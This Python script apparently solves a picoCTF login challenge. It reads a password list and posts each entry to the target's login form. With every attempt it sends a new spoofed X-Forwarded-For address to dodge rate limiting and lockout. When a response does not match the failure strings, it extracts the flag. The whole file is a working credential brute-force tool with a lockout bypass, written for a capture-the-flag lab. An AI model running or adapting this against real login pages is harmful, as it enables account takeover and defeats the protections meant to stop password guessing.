import re
import requests

BASE_URL = input(
    "Enter the host (e.g. http://amiable-citadel.picoctf.net:49881/): "
).rstrip("/")

URL = BASE_URL + "/login/"

EMAIL = "ctf-player@picoctf.org"

with open("passwords.txt") as f:
    passwords = [p.strip() for p in f if p.strip()]

session = requests.Session()

for i, password in enumerate(passwords):
    fake_ip = f"10.0.0.{i+1}"

    headers = {
        "X-Forwarded-For": fake_ip
    }

    data = {
        "email": EMAIL,
        "password": password
    }

    print(
        f"\r[{i+1}/{len(passwords)}] Trying '{password}' from {fake_ip}",
        end="",
        flush=True,
    )

    try:
        r = session.post(URL, data=data, headers=headers, timeout=5)
    except requests.RequestException as e:
        print(f"\n[!] Request failed: {e}")
        continue

    text = r.text.lower()

    failed = (
        "invalid" in text
        or "incorrect" in text
        or "wrong password" in text
        or "login failed" in text
        or "too many attempts" in text
    )

    if not failed:
        print("\n")
        print("=" * 60)
        print(f"[+] Working password: {password}")
        print("=" * 60)

        # Repeat the request (same effect as the curl command)
        try:
            flag_response = session.post(
                URL,
                data=data,
                headers=headers,
                timeout=5,
            )
        except requests.RequestException as e:
            print(f"[!] Failed to retrieve flag: {e}")
            break

        # Search for the flag
        flag = re.search(r"picoCTF\{[^}]+\}", flag_response.text)

        if flag:
            print(f"[+] Flag: {flag.group(0)}")
        else:
            print("[-] Password worked, but no flag was found.")
            print("\n----- Server Response -----")
            print(flag_response.text)
            print("---------------------------")

        break

else:
    print("\n[-] No working password found.")